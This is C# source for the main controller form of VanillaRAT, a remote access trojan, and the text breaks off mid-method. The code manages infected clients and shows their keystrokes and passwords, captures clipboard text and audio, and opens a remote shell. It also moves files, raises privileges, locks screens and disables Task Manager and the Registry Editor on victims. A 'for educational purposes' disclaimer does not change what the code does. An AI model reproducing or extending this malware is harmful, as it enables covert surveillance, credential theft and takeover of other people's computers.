using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using Telepathy;
using VanillaRat.Classes;
using VanillaRat.Forms;
using static VanillaRat.Classes.Server;
using Message = Telepathy.Message;

namespace VanillaRat
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
            Opacity = 0;
            MinimizeBox = false;
            MaximizeBox = false;
            Text = "Vanilla Rat - Offline";
            lblStatus.ForeColor = Color.Red;
            lblStatus.Text = "Offline";
            GetDataLoop.Interval = ServerUpdateInterval;
            TempDataHelper.CanUpload = true;
            
        }

        #region Declarations

        private AudioRecorder AR = new AudioRecorder();
        private ComputerInformation CI = new ComputerInformation();
        private ClientRunningApps CRA = new ClientRunningApps();
        private ClipboardTextViewer CTV = new ClipboardTextViewer();
        private Chat C = new Chat();
        private int CurrentSelectedID;
        private FileExplorer FE = new FileExplorer();
        private HardwareUsageViewer HUV = new HardwareUsageViewer();
        private Image ImageToDisplay;
        private Keylogger K = new Keylogger();
        private PasswordViewer PV = new PasswordViewer();
        private NotificationBox NB = new NotificationBox();
        private OpenWebsite OW = new OpenWebsite();
        private RemoteShell RS = new RemoteShell();
        private bool RDActive;
        private RDC RDC = new RDC();
        private int ServerUpdateInterval = Properties.Settings.Default.UpdateInterval;
        private Settings.Values Settings;

        #endregion Declarations

        #region Extra

        //Open github page (I like views)
        private void lblVersion_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/DannyTheSloth/VanillaRat");
        }

        //Get client tag from connection id
        private string GetClientTagFromId(int ConnectionId)
        {
            for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
            {
                ListViewItem LVI = lbConnectedClients.Items[n];
                if (Convert.ToInt16(LVI.SubItems[0].Text) == ConnectionId) return LVI.SubItems[2].Text;
            }

            return "Client";
        }

        //Substring Function By Artful Hacker
        public static string GetSubstringByString(string a, string b, string c)
        {
            try
            {
                return c.Substring(c.IndexOf(a) + a.Length, c.IndexOf(b) - c.IndexOf(a) - a.Length);
            }
            catch { }

            return "";
        }

        #endregion Extra

        #region Server Controls

        //Starts Server
        private void btnStartServer_Click(object sender, EventArgs e)
        {
            if (MainServer.Active) return;
            try
            {
                int Port = Settings.GetPort();
                MainServer.Start(Port);
                lblStatus.ForeColor = Color.Green;
                lblStatus.Text = "Online";
                Text = "Vanilla Rat - Online (" + Port + ")";
                GetDataLoop.Start();
                MessageBox.Show("Server started on port " + Port + ".", "Server Started", MessageBoxButtons.OK,
                    MessageBoxIcon.Information);
            }
            catch (Exception EX)
            {
                MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //Stops Server
        private void btnStopServer_Click(object sender, EventArgs e)
        {
            if (MainServer.Active)
            {
                lbConnectedClients.Items.Clear();
                MainServer.Stop();
                GetDataLoop.Stop();
                lblStatus.ForeColor = Color.Red;
                lblStatus.Text = "Offline";
                Text = "Vanilla Rat - Offline";
                MessageBox.Show("Server stopped.", "Server Stopped", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        #endregion Server Controls

        #region Builder & Settings

        //Opens settings form
        private void btnSettings_Click(object sender, EventArgs e)
        {
            SettingsForm SF = new SettingsForm();
            SF.Show();
        }

        //Opens builder form
        private void btnBuilder_Click(object sender, EventArgs e)
        {
            BuilderForm BF = new BuilderForm();
            BF.Show();
        }

        #endregion Builder & Settings

        #region Main Server Code

        #region Client Information

        //Gets client tag from client then updates list item
        private void AddClientTag(int ConnectionId, string Tag)
        {
            for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
            {
                ListViewItem LVI = lbConnectedClients.Items[n];
                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString()))
                    lbConnectedClients.Items[n].SubItems[2].Text = Tag;
                if (Settings.GetNotifyValue())
                {
                    NB = new NotificationBox();
                    NB.ClientTag = Tag;
                    NB.IP = MainServer.GetClientAddress(ConnectionId);
                    NB.Show();
                }
            }
        }

        //Gets anti-virus from client then updates list item
        private void AddAntiVirus(int ConnectionId, string AntiVirus)
        {
            for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
            {
                ListViewItem LVI = lbConnectedClients.Items[n];
                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString()))
                    lbConnectedClients.Items[n].SubItems[3].Text = AntiVirus;
            }
        }

        //Gets operating system from client then updates list item
        private void AddOperatingSystem(int ConnectionId, string OperatingSystem)
        {
            for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
            {
                ListViewItem LVI = lbConnectedClients.Items[n];
                if (LVI.SubItems[0].Text.Contains(ConnectionId.ToString()))
                    lbConnectedClients.Items[n].SubItems[4].Text = OperatingSystem;
            }
        }

        #endregion Client Information

        #region Data Handler

        //Gets all data that has been sent to the server and handles it
        public async void GetRecievedData()
        {
            Message Data;
            while (MainServer.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        string ClientAddress = MainServer.GetClientAddress(Data.connectionId);                       
                        
                        foreach (string BlockedConnection in lbBlackList.Items)
                        {
                            if (ClientAddress == BlockedConnection)
                            {
                                MainServer.Send(Data.connectionId, Encoding.ASCII.GetBytes("KillClient"));
                                await Task.Delay(50);
                                try
                                {
                                    MainServer.Disconnect(Data.connectionId);
                                } catch { }

                            }
                            
                        }

                        lbConnectedClients.Items.Add(new ListViewItem(new[]
                        {
                            Data.connectionId.ToString(), ClientAddress, "N/A", "N/A",
                            "N/A"
                        }));
                        break;

                    case EventType.Disconnected:
                        for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
                        {
                            ListViewItem LVI = lbConnectedClients.Items[n];
                            if (LVI.SubItems[0].Text.Contains(Data.connectionId.ToString()))
                                lbConnectedClients.Items.Remove(LVI);
                        }

                        break;

                    case EventType.Data:
                        HandleData(Data.connectionId, Data.data);
                        break;
                }
        }

        //Handles data by switching between byte headers
        public void HandleData(int ConnectionId, byte[] RawData)
        {
            ClientRunningApps CRA;
            byte[] ToProcess = RawData.Skip(1).ToArray();
            //Process type of data
            switch (RawData[0])
            {
                case 0: //Image Type
                    ImageToDisplay = ByteArrayToImage(ToProcess);
                    break;

                case 1: //Notification Type
                    MessageBox.Show(Encoding.ASCII.GetString(ToProcess), "Notification", MessageBoxButtons.OK,
                        MessageBoxIcon.Information);
                    break;

                case 2: //Client Tag Type
                    AddClientTag(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 3: //Process Type
                    UpdateRunningAppsListbox(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 4: //Information Type
                    UpdateComputerInformation(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 5: //File List Type
                    UpdateFiles(ConnectionId, Encoding.ASCII.GetString(ToProcess), "");
                    break;

                case 6: //Current Directory Type
                    UpdateCurrentDirectory(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 7: //Directory Up Type
                    UpdateCurrentDirectory(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    if (FE.Visible && FE.Text == "File Explorer - " + ConnectionId)
                        MainServer.Send(ConnectionId,
                            Encoding.ASCII.GetBytes("GetDF{" + FE.txtCurrentDirectory.Text + "}"));
                    break;

                case 8: //File Type
                    if (FE.Visible && FE.ConnectionID == ConnectionId)
                    {
                        File.WriteAllBytes(TempDataHelper.DownloadLocation, ToProcess);
                        Process.Start("explorer.exe", Environment.CurrentDirectory + @"\Downloaded Files\");
                        TempDataHelper.DownloadLocation = "";
                        AutoClosingMessageBox.Show("Download completed.", "Download Completed", 1000);
                    }

                    break;

                case 9: //Clipboard Text Type
                    UpdateClipboardTextViewer(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 10: //Hardware Usage Type
                    UpdateHardwareUsage(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 11: //Keystroke Type
                    UpdateKeylogger(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 12: //Current Window Type
                    UpdateCurrentWindow(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 13: //Audio Recording Type
                    UpdateAudioRecording(ConnectionId, ToProcess);
                    break;

                case 14: //Anti-Virus Tag
                    AddAntiVirus(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 15: //Windows Version Tag
                    AddOperatingSystem(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 16: //Message Type
                    AddMessage(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 17: //Passwords Type
                    AddPasswords(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;

                case 18: //Remote Shell Type
                    UpdateRemoteShell(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                    break;
            }
        }

        #endregion Data Handler

        #region Update Functions

        //Update remote shell with output
        public void UpdateRemoteShell(int ConnectionId, string Output)
        {
            foreach (RemoteShell RS in Application.OpenForms.OfType<RemoteShell>())
                if (RS.Visible && RS.ConnectionID == ConnectionId && RS.Update)
                {
                    if (string.IsNullOrWhiteSpace(RS.txtConsole.Text))
                        RS.txtConsole.Text = Output;
                    else
                        RS.txtConsole.AppendText(Environment.NewLine + Output);
                    return;
                }

            RS = new RemoteShell();
            RS.ConnectionID = ConnectionId;
            RS.Text = "Remote Shell - " + ConnectionId;
            RS.Show();
            if (RS.ConnectionID == ConnectionId)
            {
                if (string.IsNullOrWhiteSpace(RS.txtConsole.Text))
                    RS.txtConsole.Text = Output;
                else
                    RS.txtConsole.AppendText(Environment.NewLine + Output);
            }
        }

        //Add passwords to password viewer
        public void AddPasswords(int ConnectionId, string Passwords)
        {
            foreach (PasswordViewer PV in Application.OpenForms.OfType<PasswordViewer>())
                if (PV.Visible && PV.ConnectionID == ConnectionId && PV.Update)
                {
                    string[] PasswordsArrayRaw = Passwords.Split(new[] {"]["}, StringSplitOptions.None);
                    foreach (string S in PasswordsArrayRaw.Skip(1).ToArray()) PV.lbPasswords.Items.Add(S);
                    return;
                }

            PV = new PasswordViewer();
            PV.ConnectionID = ConnectionId;
            PV.Text = "Password Viewer - " + ConnectionId;
            PV.Show();
            if (PV.ConnectionID == ConnectionId)
            {
                string[] PasswordsArrayRaw = Passwords.Split(new[] {"]["}, StringSplitOptions.None);
                foreach (string S in PasswordsArrayRaw.Skip(1).ToArray()) PV.lbPasswords.Items.Add(S);
            }
        }

        //Add message to chat
        public void AddMessage(int ConnectionId, string Message)
        {
            foreach (Chat C in Application.OpenForms.OfType<Chat>())
                if (C.Visible && C.ConnectionID == ConnectionId && C.Update)
                {
                    if (string.IsNullOrWhiteSpace(C.txtChat.Text))
                        C.txtChat.Text = GetClientTagFromId(ConnectionId) + ": " + Message;
                    else
                        C.txtChat.AppendText(Environment.NewLine + GetClientTagFromId(ConnectionId) + ": " + Message);
                }
        }

        //Update audio recording
        public void UpdateAudioRecording(int ConnectionId, byte[] Audio)
        {
            foreach (AudioRecorder AR in Application.OpenForms.OfType<AudioRecorder>())
                if (AR.Visible && AR.ConnectionID == ConnectionId && AR.Update)
                {
                    AR.BytesToPlay = Audio;
                    return;
                }

            AR = new AudioRecorder();
            AR.ConnectionID = ConnectionId;
            AR.Text = "Audio Recorder - " + ConnectionId;
            AR.Show();
            if (AR.ConnectionID == ConnectionId) AR.BytesToPlay = Audio;
        }

        //Updates currently selected window on keylogger
        public void UpdateCurrentWindow(int ConnectionId, string WindowName)
        {
            foreach (Keylogger K in Application.OpenForms.OfType<Keylogger>())
                if (K.Visible && K.ConnectionId == ConnectionId && K.Update)
                    K.txtCurrentWindow.Text = WindowName;
        }

        //Updates keylogger
        public void UpdateKeylogger(int ConnectionId, string Keystroke)
        {
            foreach (Keylogger K in Application.OpenForms.OfType<Keylogger>())
                if (K.Visible && K.ConnectionId == ConnectionId && K.Update)
                {
                    K.txtKeylogger.AppendText(Keystroke + " ");
                    return;
                }

            K = new Keylogger();
            K.Show();
            K.ConnectionId = ConnectionId;
            K.Text = "Keylogger - " + ConnectionId;
            if (K.ConnectionId == ConnectionId) K.txtKeylogger.AppendText(Keystroke + " ");
        }

        //Updates hardware usage data
        public void UpdateHardwareUsage(int ConnectionId, string UsageData)
        {
            foreach (HardwareUsageViewer HUV in Application.OpenForms.OfType<HardwareUsageViewer>())
                if (HUV.Visible && HUV.ConnectionID == ConnectionId && HUV.Update)
                {
                    double CPUUsageRaw = Convert.ToDouble(GetSubstringByString("{", "}", UsageData));
                    string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
                    string RamAmount = GetSubstringByString("[", "]", UsageData);
                    double DiskUsageRaw = Convert.ToDouble(GetSubstringByString("<", ">", UsageData));
                    string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
                    HUV.txtAvailableRam.Text = RamAmount;
                    HUV.txtCpuUsage.Text = CPUUsageString;
                    HUV.txtDiskUsage.Text = DiskUsageString;
                    return;
                }

            if (HUV.Visible && HUV.Text == "Hardware Usage Viewer - " + ConnectionId)
            {
                double CPUUsageRaw = Convert.ToDouble(GetSubstringByString("{", "}", UsageData));
                string CPUUsageString = Convert.ToInt32(CPUUsageRaw).ToString();
                string RamAmount = GetSubstringByString("[", "]", UsageData);
                double DiskUsageRaw = Convert.ToDouble(GetSubstringByString("<", ">", UsageData));
                string DiskUsageString = Convert.ToInt32(DiskUsageRaw).ToString();
                HUV.txtAvailableRam.Text = RamAmount;
                HUV.txtCpuUsage.Text = CPUUsageString;
                HUV.txtDiskUsage.Text = DiskUsageString;
            }

            HUV = new HardwareUsageViewer();
            HUV.Show();
            HUV.ConnectionID = ConnectionId;
            HUV.Text = "Hardware Usage Viewer - " + ConnectionId;
        }

        //Updates clipboard text
        public void UpdateClipboardTextViewer(int ConnectionId, string ClipboardText)
        {
            foreach (ClipboardTextViewer CTV in Application.OpenForms.OfType<ClipboardTextViewer>())
                if (CTV.Visible && CTV.ConnectionID == ConnectionId && CTV.Update)
                {
                    CTV.txtClipboardText.Text += Environment.NewLine;
                    CTV.txtClipboardText.Text += DateTime.Now.ToString();
                    CTV.txtClipboardText.Text += Environment.NewLine;
                    CTV.txtClipboardText.Text += ClipboardText;
                    return;
                }

            CTV = new ClipboardTextViewer();
            CTV.Show();
            CTV.ConnectionID = ConnectionId;
            CTV.Text = "Clipboard Text Viewer - " + ConnectionId;
            if (CTV.ConnectionID == ConnectionId)
            {
                CTV.txtClipboardText.Text = DateTime.Now.ToString();
                CTV.txtClipboardText.Text += Environment.NewLine;
                CTV.txtClipboardText.Text += ClipboardText;
            }
        }

        //Updates file browser current directory
        public void UpdateCurrentDirectory(int ConnectionId, string CurrentDirectory)
        {
            foreach (FileExplorer FE in Application.OpenForms.OfType<FileExplorer>())
                if (FE.Visible && FE.ConnectionID == ConnectionId && FE.Update)
                    FE.txtCurrentDirectory.Text = CurrentDirectory;
        }

        //Updates files in file browser
        public void UpdateFiles(int ConnectionId, string Files, string CurrentDirectory)
        {
            string[] FilesArrayRaw = Files.Split(new[] {"]["}, StringSplitOptions.None);
            string[] FilesArray = FilesArrayRaw.Skip(1).ToArray();
            foreach (FileExplorer FE in Application.OpenForms.OfType<FileExplorer>())
                if (FE.Visible && FE.ConnectionID == ConnectionId && FE.Update)
                {
                    FE.lbFiles.Items.Clear();
                    foreach (string S in FilesArray)
                    {
                        string Filename = GetSubstringByString("{", "}", S);
                        string Extension = GetSubstringByString("<", ">", S);
                        string DateCreated = GetSubstringByString("[", "]", S);
                        string[] ToAdd = {Filename, Extension, DateCreated};
                        var ListItem = new ListViewItem(ToAdd);
                        FE.lbFiles.Items.Add(ListItem);
                    }

                    return;
                }

            FE = new FileExplorer();
            FE.Show();
            FE.ConnectionID = ConnectionId;
            FE.Text = "File Explorer - " + FE.ConnectionID;
            if (FE.ConnectionID == ConnectionId)
            {
                FE.lbFiles.Items.Clear();
                foreach (string S in FilesArray)
                {
                    string Filename = GetSubstringByString("{", "}", S);
                    string Extension = GetSubstringByString("<", ">", S);
                    string DateCreated = GetSubstringByString("[", "]", S);
                    string[] ToAdd = {Filename, Extension, DateCreated};
                    var ListItem = new ListViewItem(ToAdd);
                    FE.lbFiles.Items.Add(ListItem);
                }
            }
        }

        //Updates computer information form
        public void UpdateComputerInformation(int ConnectionId, string Info)
        {
            string[] InfoArray = Info.Split(',');
            List<string> InfoList = new List<string>(InfoArray);
            foreach (ComputerInformation CI in Application.OpenForms.OfType<ComputerInformation>())
                if (CI.Visible && CI.ConnectionID == ConnectionId && CI.Update)
                {
                    CI.lbInformation.Items.Clear();
                    CI.lbInformation.Items.AddRange(InfoList.ToArray<string>());
                    CI.lbInformation.Items.Remove("");
                    return;
                }

            CI = new ComputerInformation();
            CI.Show();
            CI.ConnectionID = ConnectionId;
            CI.Text = "Computer Information - " + CI.ConnectionID;
            if (CI.ConnectionID == ConnectionId)
            {
                CI.lbInformation.Items.Clear();
                CI.lbInformation.Items.AddRange(InfoList.ToArray());
                CI.lbInformation.Items.Remove("");
            }
        }

        //Updates process list
        public void UpdateRunningAppsListbox(int ConnectionId, string Processes)
        {
            string[] ProcessesArrayRaw = Processes.Split(new[] {"]["}, StringSplitOptions.None);
            string[] ProcessesArray = ProcessesArrayRaw.Skip(1).ToArray();
            List<string> ProcessesList = new List<string>(ProcessesArray);
            ProcessesList.AddRange(ProcessesArray);
            foreach (ClientRunningApps CRA in Application.OpenForms.OfType<ClientRunningApps>())
                if (CRA.Visible && CRA.ConnectionID == ConnectionId && CRA.Update)
                {
                    CRA.lbRunningProcesses.Items.Clear();
                    foreach (string S in ProcessesArray)
                    {
                        string PName = GetSubstringByString("{", "}", S);
                        string PID = GetSubstringByString("<", ">", S);
                        string PWindow = GetSubstringByString("[", "]", S);
                        string[] ToAdd = {PName, PID, PWindow};
                        var ListItem = new ListViewItem(ToAdd);
                        CRA.lbRunningProcesses.Items.Add(ListItem);
                    }

                    return;
                }

            CRA = new ClientRunningApps();
            CRA.Show();
            CRA.ConnectionID = ConnectionId;
            CRA.Text = "Running Applications - " + CRA.ConnectionID;
            if (CRA.ConnectionID == ConnectionId)
            {
                CRA.lbRunningProcesses.Items.Clear();
                foreach (string S in ProcessesArray)
                {
                    string PName = GetSubstringByString("{", "}", S);
                    string PID = GetSubstringByString("<", ">", S);
                    string PWindow = GetSubstringByString("[", "]", S);
                    string[] ToAdd = {PName, PID, PWindow};
                    var ListItem = new ListViewItem(ToAdd);
                    CRA.lbRunningProcesses.Items.Add(ListItem);
                }
            }
        }

        //Loops data receiving
        private void GetDataLoop_Tick(object sender, EventArgs e)
        {
            GetRecievedData();
        }

        #endregion Update Functions

        #endregion Main Server Code

        #region Form

        //On form load
        private void Main_Load(object sender, EventArgs e)
        {
            FadeIn(5);
            DialogResult DR = MessageBox.Show(
                "I, the creator, am in no way responsible for any actions that you may make using this software. You take full responsibility with any action taken using this software. Please take note that this application was designed for educational purposes and should never be used maliciously. By downloading the software or source to the software, you automatically accept this agreement.",
                "Agreement", MessageBoxButtons.OKCancel, MessageBoxIcon.None);
            if (DR == DialogResult.Cancel)
                Close();
            MessageBox.Show(
                "NOTICE: This will be the last version of VanillaRAT! After v1.7, this program will no longer be updated. I am working on a new RAT called PhotonRAT, it will be much more stable, faster, and safer to use. Please pay attention for updates and news on Photon. - Daniel Huinda, Developer of VanillaRAT",
                "IMPORTANT NOTICE", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            if (File.Exists("BlockedConnections.txt"))
            {
                using (StreamReader SR = new StreamReader("BlockedConnections.txt"))
                {
                    string Line;
                    while ((Line = SR.ReadLine()) != null)
                    {
                        lbBlackList.Items.Add(Line);
                    }
                }
            }
        }

        //Fade form in
        private async void FadeIn(int UpdateInterval)
        {
            while (Opacity < 1.0)
            {
                await Task.Delay(UpdateInterval);
                Opacity += 0.05;
            }

            Opacity = 1;
        }

        //On form close
        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            MainServer.Stop();
            StringBuilder SB = new StringBuilder();
            foreach (string S in lbBlackList.Items)
                SB.AppendLine(S);
            File.WriteAllText("BlockedConnections.txt", SB.ToString());
        }

        //Prevents column size changing
        private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
        {
            e.NewWidth = lbConnectedClients.Columns[e.ColumnIndex].Width;
            e.Cancel = true;
        }

        //Switches currently selected connection id based on list selection
        private void lbConnectedClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                ListViewItem LVI = lbConnectedClients.SelectedItems[0];
                CurrentSelectedID = Convert.ToInt16(LVI.SubItems[0].Text);
                lblCurrentID.Text = "Client ID: " + CurrentSelectedID;
            }
            catch { }
        }

        //On black list drag over
        private void OnBlacklistEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(typeof(ListViewItem)))
                e.Effect = DragDropEffects.Move;

        }

        //On black list drag drop
        private void OnBlacklistDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(typeof(ListViewItem)))
            {
                

                ListViewItem LVI = (ListViewItem) e.Data.GetData(typeof(ListViewItem));
                DialogResult DR = MessageBox.Show("Are you sure you would like to block " + LVI.SubItems[1].Text + "? This will kill the current connection.",
                    "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (DR != DialogResult.Yes) return;
                if (!lbBlackList.Items.Contains(LVI.SubItems[1].Text))
                    lbBlackList.Items.Add(LVI.SubItems[1].Text);
                MainServer.Send(Convert.ToInt16(LVI.SubItems[0].Text), Encoding.ASCII.GetBytes("KillClient"));
            }
        }

        //On client drag
        private void OnClientDrag(object sender, ItemDragEventArgs e)
        {
            DoDragDrop(e.Item, DragDropEffects.Move);
        }

        //Check if delete key was pressed on black list
        private void OnBlacklistKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Delete)
            {
                lbBlackList.Items.Remove(lbBlackList.SelectedItem);
            }
                
        }

        #endregion Form

        #region Client Functions

        //Toggle Anti-Process
        private void btnToggleAntiProcess_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            DialogResult DR =
                MessageBox.Show(
                    "Are you sure you would like to toggle Anti-Process? This will either disable or enable processes such as task manager, and registry editor.",
                    "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (DR == DialogResult.Yes)
                MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("ToggleAntiProcess"));
        }

        //Update Client
        private void btnUpdateClient_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            OpenFileDialog OFD = new OpenFileDialog();
            OFD.Multiselect = false;
            OFD.InitialDirectory = Environment.CurrentDirectory + @"\Clients\";
            if (OFD.ShowDialog() == DialogResult.OK)
            {
                if (!TempDataHelper.CanUpload)
                {
                    MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                }
                else
                {
                    TempDataHelper.CanUpload = false;
                    string FileString = OFD.FileName;
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }

                    AutoClosingMessageBox.Show("Starting client update.", "Starting Upload", 1000);
                    MainServer.Send(ConnectionId,
                        Encoding.ASCII.GetBytes("StartFileReceive{[UPDATE]" + Path.GetFileName(OFD.FileName) + "}"));
                    Thread.Sleep(80);
                    MainServer.Send(ConnectionId, FileBytes);
                    TempDataHelper.CanUpload = true;
                }
            }
        }

        //Start remote shell 
        private void btnRemoteShell_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartRS"));
        }

        //Open chat with client
        private void btnOpenChat_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("OpenChat"));
            foreach (Chat C in Application.OpenForms.OfType<Chat>())
                if (C.Visible && C.ConnectionID == ConnectionId)
                    return;
            C = new Chat();
            C.ConnectionID = ConnectionId;
            C.Text = "Chat - " + ConnectionId;
            C.Show();
        }

        //Start or stop screen locker
        private void btnLockComputer_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("ToggleScreenlock"));
        }

        //Get running processes
        private void btnGetRunningApps_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetProcesses"));
        }

        //Open website
        private void btnWebsiteOpener_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            foreach (OpenWebsite OW in Application.OpenForms.OfType<OpenWebsite>())
                if (OW.Visible && OW.ConnectionID == ConnectionId)
                    return;
            OW = new OpenWebsite();
            OW.Show();
            OW.ConnectionID = ConnectionId;
            OW.Text = "Open Website - " + OW.ConnectionID;
        }

        //Get computer information
        private void btnOpenComputerInfo_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetComputerInfo"));
        }

        //Raise to admin
        private void btnRaisePerms_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("RaisePerms"));
        }

        //Get hardware usage data
        private void btnGetHardwareUsage_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartUsageStream"));
        }

        //Kill client
        private void btnClientKill_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("KillClient"));
        }

        //Disconnect client
        private void btnClientDisconnect_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("DisconnectClient"));
        }

        //Show client console (No longer working.)
        private void btnShowClientConsole_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            DialogResult DR =
                MessageBox.Show("Are you sure you would like to show the client the console? This can not be reversed!",
                    "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (DR == DialogResult.Yes) MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("ShowClientConsole"));
        }

        //Send message box
        private void btnSendMessageBox_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId,
                Encoding.ASCII.GetBytes("MsgBox<{<" + messageToolStripMenuItem2.Text + ">[" + txtHeader.Text + "]{" +
                                        cbButtons.SelectedItem + "}" + "/" + cbIcons.SelectedItem + @"\}>"));
        }

        //Preview message box
        private void btnPreviewMessage_Click(object sender, EventArgs e)
        {
            MessageBoxButtons MBB = MessageBoxButtons.OK;
            MessageBoxIcon MBI = MessageBoxIcon.None;

            #region Button & Icon conditional statements

            if (cbButtons.SelectedItem == null || cbIcons.SelectedItem == null) return;
            if (cbButtons.SelectedItem.Equals("Abort Retry Ignore"))
                MBB = MessageBoxButtons.AbortRetryIgnore;
            else if (cbButtons.SelectedItem.Equals("OK"))
